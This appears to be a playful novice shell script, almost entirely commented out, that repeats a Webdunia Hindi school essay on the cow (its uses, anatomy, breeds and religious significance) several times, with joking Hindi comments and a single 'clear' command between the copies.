#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ







clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


